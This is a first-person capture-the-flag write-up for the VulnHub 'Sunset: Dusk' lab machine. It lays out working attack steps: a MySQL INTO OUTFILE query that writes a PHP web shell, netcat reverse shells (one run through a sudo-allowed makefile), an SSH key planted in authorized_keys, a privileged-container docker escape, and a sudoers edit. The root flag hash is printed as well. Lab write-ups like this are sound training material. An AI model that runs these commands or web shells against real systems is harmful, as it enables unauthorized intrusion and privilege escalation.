# Sunset: Dusk

https://www.vulnhub.com/entry/sunset-dusk,404/

## Reconnaissance

An intense nmap scan revealed:

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     pyftpdlib 1.5.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.53.6:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 b5:ff:69:2a:03:fd:6d:04:ed:2a:06:aa:bf:b2:6a:7c (RSA)
|   256 0b:6f:20:d6:7c:6c:84:be:d8:40:61:69:a2:c6:e8:8a (ECDSA)
|_  256 85:ff:47:d9:92:50:cb:f7:44:6c:b4:f4:5c:e9:1c:ed (ED25519)
25/tcp   open  smtp    Postfix smtpd
|_smtp-commands: dusk.dusk, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
| ssl-cert: Subject: commonName=dusk.dusk
| Subject Alternative Name: DNS:dusk.dusk
| Not valid before: 2019-11-27T21:09:14
|_Not valid after:  2029-11-24T21:09:14
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
3306/tcp open  mysql   MySQL 5.5.5-10.3.18-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.18-MariaDB-0+deb10u1
|   Thread ID: 40
|   Capabilities flags: 63486
|   Some Capabilities: InteractiveClient, Support41Auth, Speaks41ProtocolNew, SupportsLoadDataLocal, SupportsTransactions, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, IgnoreSigpipes, Speaks41ProtocolOld, ODBCClient, FoundRows, LongColumnFlag, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: AcN=%B[&HyJDTZF2e'0[
|_  Auth Plugin Name: mysql_native_password
8080/tcp open  http    PHP cli server 5.5 or later (PHP 7.3.11-1)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: Host:  dusk.dusk; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

80 is just the default debian page again, but 8080 seems to be a php server running off /var/tmp, listing its files and running the index.php file there. Looks pretty juicy. nikto on either failed: nothing interesting on the default page, and 8080 is basically just a ftp listing.

Speaking of, ftp did not allow anonymous access. Neither did the mysql endpoint. Playing around with SMTP didn't achieve much. Ultimately a scan with legion, and a check for default credentials, revealed mysql used `root:password`. 

## MySQL to create php shell, then reverse netcat.

The following command got me in to mysql: `mysql -u root -p -h 192.168.53.6` followed by entering the password `password`.

I browsed around for a bit, but found nothing. However, given the :8080 site was a PHP cli site which helpfully listed its exact location on the page, I tried the 'into outfile' trick and it worked:

```
MariaDB [(none)]> select '<?php system($_GET["cmd"]); ?>' into outfile '/var/tmp/cmd.php';
Query OK, 1 row affected (0.001 sec)
```

Then going to the php site, sure enough cmd.php was there. Browsing to it with `192.168.53.6:8080/cmd.php?cmd=ls` ran ls successfully. Time for a reverse netcat shell!

`192.168.53.6:8080/cmd.php?cmd=nc%20192.168.53.4%204444%20-e%20/bin/bash` plus `nc -nvlp 4444` in another prompt got me a reverse nc, then `python -c "import pty;pty.spawn('/bin/bash');"` got me a nice shell.

## On machine enumeration

As `www-data`, I ran `sudo -l`:

```
Matching Defaults entries for www-data on dusk:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on dusk:
    (dusk) NOPASSWD: /usr/bin/ping, /usr/bin/make, /usr/bin/sl
```

`ping` and `sl` won't provide anything. `make` looked promising, but even though I can execute commands with it they don't run as dusk, just me as www-data.

## Server resetting (a dead end)

However, given this server has smtp, I browsed to /var/spool/mail and found three files, for dusk, root and www-data. I copied this into /var/tmp so I could read it better, and it contains many messages that are identical (except for time):

```
From www-data@dusk.dusk  Sat Nov 30 17:50:02 2019
Return-Path: <www-data@dusk.dusk>
X-Original-To: www-data
Delivered-To: www-data@dusk.dusk
Received: by dusk.dusk (Postfix, from userid 33)
	id 17C671824; Sat, 30 Nov 2019 17:50:01 -0500 (EST)
From: root@dusk.dusk (Cron Daemon)
To: www-data@dusk.dusk
Subject: Cron <www-data@dusk> /usr/bin/php -S 192.168.1.167:8080 -t /tmp
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/var/www>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=www-data>
Message-Id: <20191130225002.17C671824@dusk.dusk>
Date: Sat, 30 Nov 2019 17:50:01 -0500 (EST)

[Sat Nov 30 17:50:01 2019] Failed to listen on 192.168.1.167:8080 (reason: Address already in use)
```

Later it switches the dir from /tmp/ to /var/tmp. There was an email every minute. 

To me, this looked like dusk is trying to start a php webserver, but can't because www-data already has.

I ran `ps -U www-data -o "%P %c %a"` to see the running commands www-data has done:

```
PPID COMMAND         COMMAND
  651 apache2         /usr/sbin/apache2 -k start
  651 apache2         /usr/sbin/apache2 -k start
  651 apache2         /usr/sbin/apache2 -k start
  651 apache2         /usr/sbin/apache2 -k start
  651 apache2         /usr/sbin/apache2 -k start
 1141 sh              /bin/sh -c /usr/bin/php -S 0.0.0.0:8080 -t /var/tmp
 1143 php             /usr/bin/php -S 0.0.0.0:8080 -t /var/tmp
  651 apache2         /usr/sbin/apache2 -k start
 1146 sh              sh -c nc 192.168.1.3 4444 -e /bin/bash
 1517 bash            bash
 1518 python          python -c import pty;pty.spawn('/bin/bash');
 1528 bash            /bin/bash
 1529 ps              ps -U www-data -o %P %c %a
```

In theory, if I killed `1141` or `1143`, above, then the cron job should start a new server as dusk, right?

Before trying, I ran `/usr/bin/php -S 0.0.0.0:8081 -t /var/tmp` to start a secondary server as www-data.

When I killed the server, it came back shortly. Doing a whoami, however, revealed it was still www-data. Relooking at the mail message, and examining the new logs, I saw it was actually restarting the server for www-data, not dusk /facepalm

## Learning how sudo works, again

I went back to look at make, which sudo -l told me I could use. It said `(dusk) NOPASSWD`, so why was I getting a sudo prompt when I ran it with `sudo /usr/bin/make`? Eventually I figured it out: `sudo -l` was telling me I could use sudo to act as dusk for the command, but I needed to specify dusk when running sudo!

I created a makefile for a reverse netcat using `printf "all:\n\tnc 192.168.1.3 6666 -e /bin/bash" > makefile`, then ran it with `sudo -u dusk /usr/bin/make`, and sure enough it worked and I had a dusk shell :D

I went to the home dir for dusk, created `.ssh/authorized_keys` with my kali's public ssh key, `chmod 644` for authorized_keys and `chmod 700` for .ssh, and finally was able to remotely ssh in for a proper shell.

## Recon as dusk, docker and win!

dusk couldn't run sudo -l. There was also nothing in their user dir of use. I used a find command to find everything they owned and there was nothing useful. Their mail inbox contained only a test email I had sent the previous day.

Ultimately I ran [linenum.sh](https://github.com/rebootuser/LinEnum) (using nano to create it) and found that docker was running on the host, with dusk as a group member! Problem was, no containers were running and no images were available, and I had setup the vm so it couldn't access the net as a precaution.

I downloaded busybox on my macbook which runs docker, and saved it to a tar file (`docker pull busybox` and then `docker save busybox > busybox.tar`). Then I used a vbox shared folder to get it into kali, before finally scp'ing it to the dusk vm and loading it (`docker load --input busybox.tar`). Finally, I used the following command to get a shell in a container with access to the parent system: `docker run --privileged -v /root:/tmp -ti busybox`

This gave me access to the flag file:

```
/tmp # cat root.txt 
Congratulations on successfully completing the challenge! I hope you enjoyed as much as i did while creating such device. 
Send me some feedback at @whitecr0wz! 


                         .'  .-.'__.-----.\
                        /    `-'(__--'
                      .'       `. _ `--._
                     /            .`--'''`
                    /           .'   
                 _.'-.         J    
                /    J         F    
              .'     F        J     
             /      /         /-.    
            /      /         /   \    
           /      /         J    |      
          /      /          /   /   
         /   /  /          J   /    
        /   /  /           /-'/
       /   / -'           /  /    
      J   / /            / .'      
      / -'-'   /        /-'        
     (/|      |        /           
      /.'   ) | _.--  /            
     //     < \/   (  |            
    //       `.\    `.`.           
   //     ___/ \ `-.  `.`. 
   - ----'      )|`.\)  `-))\-')  
                '   )     ')/

Until then!

8930fa079a510ee880fe047d40dc613e
```

However I wanted to get actual root on the machine, so I mounted the etc folder: `docker run --privileged -v /etc:/tmp -ti busybox`

Then I used `vi sudoers` and added `dusk    ALL=(ALL) NOPASSWD:ALL` under www-data's sudoer entry, and saved with `:wq!` (the exclamation because it was readonly). 

Back on the host, `sudo -i` now gave me root :)
